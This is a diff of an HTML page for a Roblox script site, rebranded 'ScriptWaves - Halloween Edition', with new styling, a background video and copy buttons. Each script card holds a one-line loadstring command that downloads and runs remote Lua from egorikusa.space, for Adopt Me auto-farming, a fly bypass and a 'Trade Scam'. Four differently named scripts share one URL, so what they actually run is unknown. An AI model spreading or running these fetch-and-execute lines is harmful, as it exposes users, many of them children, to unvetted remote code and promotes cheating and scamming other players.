@@ -3,69 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Scripts</title>
+    <title>ScriptWaves - Halloween Edition</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #f0f0f0;
+            color: #ffffff;
             margin: 0;
             padding: 0;
+            position: relative;
+            overflow: hidden;
+        }
+        video {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            min-width: 100%;
+            min-height: 100%;
+            width: auto;
+            height: auto;
+            z-index: -1;
+            transform: translate(-50%, -50%);
+            opacity: 0.7; /* Poți ajusta opacitatea după preferințe */
         }
         header {
-            background-color: #282c34;
-            color: #ffffff;
+            background-color: rgba(51, 51, 51, 0.8);
+            color: #ff9900;
             padding: 20px 0;
             text-align: center;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
-        h1 {
-            margin: 0;
-            font-size: 2.5em;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
         }
         nav {
             margin: 20px 0;
         }
         nav a {
-            color: #61dafb;
+            color: #ff9900;
             margin: 0 15px;
             text-decoration: none;
             font-weight: bold;
+            cursor: pointer;
         }
         nav a:hover {
             text-decoration: underline;
-            color: #21a1f1;
+            color: #ffcc00;
         }
         .container {
             width: 80%;
             margin: auto;
-            overflow: hidden;
             padding: 20px;
         }
         .script, .contact {
-            background: #ffffff;
+            background: rgba(68, 68, 68, 0.8);
             margin: 20px 0;
             padding: 20px;
             border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
         }
         footer {
             text-align: center;
             padding: 20px 0;
-            background-color: #282c34;
-            color: #ffffff;
-            position: relative;
-            bottom: 0;
-            width: 100%;
+            background-color: rgba(51, 51, 51, 0.8);
+            color: #ff9900;
         }
         h2 {
-            border-bottom: 2px solid #61dafb;
+            border-bottom: 2px solid #ff9900;
             padding-bottom: 10px;
         }
         pre {
-            background-color: #f7f7f7;
-            border-left: 4px solid #61dafb;
+            background-color: #666666;
+            border-left: 4px solid #ff9900;
             padding: 10px;
             overflow-x: auto;
+            filter: blur(2px);
+            transition: filter 0.3s;
+        }
+        pre:hover {
+            filter: blur(0);
         }
         .card {
             border: 1px solid #e0e0e0;
@@ -77,33 +89,84 @@
         .card:hover {
             transform: scale(1.02);
         }
+        .copy-button {
+            background-color: #ff9900;
+            color: #1a1a1a;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+        .copy-button:hover {
+            background-color: #ffcc00;
+        }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
 
+<video autoplay muted loop>
+    <source src="https://videos.pexels.com/video-files/5435209/5435209-uhd_2732_1440_25fps.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+</video>
+
 <header>
-    <h1>Roblox Scripts</h1>
+    <h1>ScriptWaves - Halloween Edition</h1>
     <nav>
-        <a href="#scripts">Scripts</a>
-        <a href="#contact">Contact</a>
+        <a onclick="showSection('scripts')">Scripts</a>
+        <a onclick="showSection('support')">Support</a>
     </nav>
 </header>
 
 <div class="container">
-    <section id="scripts">
+    <section id="scripts" class="section">
         <h2>Available Scripts</h2>
         <div class="script card">
             <h3>Adopt Me Auto Farm Candy's</h3>
-            <pre>
+            <pre id="script1">
 loadstring(game:HttpGet("https://egorikusa.space/f76e4a441461c4843466a9a4.lua", true))()
             </pre>
+            <button class="copy-button" onclick="copyToClipboard('script1')">Copy Script</button>
         </div>
-        <!-- Add more scripts here -->
+        <div class="script card">
+            <h3>Adopt Me Bucks Quest Farm</h3>
+            <pre id="script2">
+loadstring(game:HttpGet("https://egorikusa.space/a0a4ec71b2aa4b46d8f8836d.lua", true))()
+            </pre>
+            <button class="copy-button" onclick="copyToClipboard('script2')">Copy Script</button>
+        </div>
+        <div class="script card">
+            <h3>Adopt Me Auto Hatch Eggs</h3>
+            <pre id="script3">
+loadstring(game:HttpGet("https://egorikusa.space/a0a4ec71b2aa4b46d8f8836d.lua", true))()
+            </pre>
+            <button class="copy-button" onclick="copyToClipboard('script3')">Copy Script</button>
+        </div>
+        <div class="script card">
+            <h3>New OP Adopt Me Trade Scam</h3>
+            <pre id="script4">
+loadstring(game:HttpGet("https://egorikusa.space/a0a4ec71b2aa4b46d8f8836d.lua", true))()
+            </pre>
+            <button class="copy-button" onclick="copyToClipboard('script4')">Copy Script</button>
+        </div>
+        <div class="script card">
+            <h3>Adopt Me Fly Script Bypassed</h3>
+            <pre id="script5">
+loadstring(game:HttpGet("https://egorikusa.space/a0a4ec71b2aa4b46d8f8836d.lua", true))()
+            </pre>
+            <button class="copy-button" onclick="copyToClipboard('script5')">Copy Script</button>
+        </div>
     </section>
 
-    <section id="contact">
+    <section id="support" class="section hidden">
         <h2>Contact Information</h2>
         <div class="contact card">
+            <p><strong>Owner:</strong> Wasper 🎃</p>
+            <p><strong>Design Manager:</strong> Sara 🎀</p>
+            <p><strong>Contributor:</strong> Winter 👻</p>
             <p><strong>YouTube Channel:</strong> <a href="https://www.youtube.com/@oxykila" target="_blank">oxykila</a></p>
             <p><strong>Discord:</strong> despited</p>
             <p><strong>SoundCloud:</strong> <a href="https://soundcloud.com/luhwoxx" target="_blank">luhwoxx</a></p>
@@ -112,8 +175,31 @@ loadstring(game:HttpGet("https://egorikusa.space/f76e4a441461c4843466a9a4.lua", 
 </div>
 
 <footer>
-    <p>&copy; 2024 Roblox Scripts. All rights reserved.</p>
+    <p>&copy; 2024 ScriptWaves. All rights reserved.</p>
 </footer>
+
+<script>
+    function showSection(section) {
+        const sections = document.querySelectorAll('.section');
+        sections.forEach(sec => {
+            if (sec.id === section) {
+                sec.classList.remove('hidden');
+            } else {
+                sec.classList.add('hidden');
+            }
+        });
+    }
+
+    function copyToClipboard(scriptId) {
+        const script = document.getElementById(scriptId).innerText;
+        navigator.clipboard.writeText(script).then(() => {
+            alert('Script copied to clipboard!');
+        }).catch(err => {
+            console.error('Could not copy text: ', err);
+        });
+    }
+</script>
 
 </body>
 </html>
+
